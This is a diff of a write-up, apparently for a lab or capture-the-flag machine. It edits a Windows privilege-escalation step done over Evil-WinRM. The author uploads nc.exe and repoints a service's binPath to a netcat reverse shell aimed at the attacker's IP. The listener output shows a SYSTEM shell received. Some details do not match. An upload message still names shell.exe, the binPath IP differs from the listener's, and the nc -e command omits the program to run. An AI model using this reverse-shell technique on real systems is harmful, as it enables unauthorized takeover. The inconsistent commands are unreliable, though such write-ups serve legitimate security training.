@@ -259,16 +259,14 @@ These privileges can be exploited by an attacker to escalate their access, poten
 
 
 
-
-
 ```
 
 ```
 
-Uploading the shell.exe executable 
+Uploading the nc.exe executable 
 
 ```
-*Evil-WinRM* PS C:\Users\j.rock\Documents> upload /home/andrepaiva/shell.exe
+*Evil-WinRM* PS C:\Users\j.rock\Documents> upload /home/andrepaiva/nc.exe
                                         
 Info: Uploading /home/andrepaiva/shell.exe to C:\Users\j.rock\Documents\shell.exe
                                         
@@ -287,9 +285,24 @@ $ nc -lvp 4444
 Changing the binary path of the AmazonSSMAgent service.
 
 ```
-*Evil-WinRM* PS C:\Users\j.rock\Documents> sc.exe config AmazonSSMAgent binPath="C:\Users\j.rock\Documents\shell.exe"
+*Evil-WinRM* PS C:\Users\j.rock\Documents> sc.exe config cfn-hup binPath="C:\Users\j.rock\Documents\nc.exe -e 10.10.106.26 4444"
 [SC] ChangeServiceConfig SUCCESS
 ```
+
+Stopped and restarted the service
+
+System privileges gained:
+
+```└─$ nc -lvp 4444 
+listening on [any] 4444 ...
+10.10.248.137: inverse host lookup failed: Unknown host
+connect to [10.11.106.26] from (UNKNOWN) [10.10.248.137] 50991
+Microsoft Windows [Version 10.0.17763.4010]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+```
+
+
 
 
 
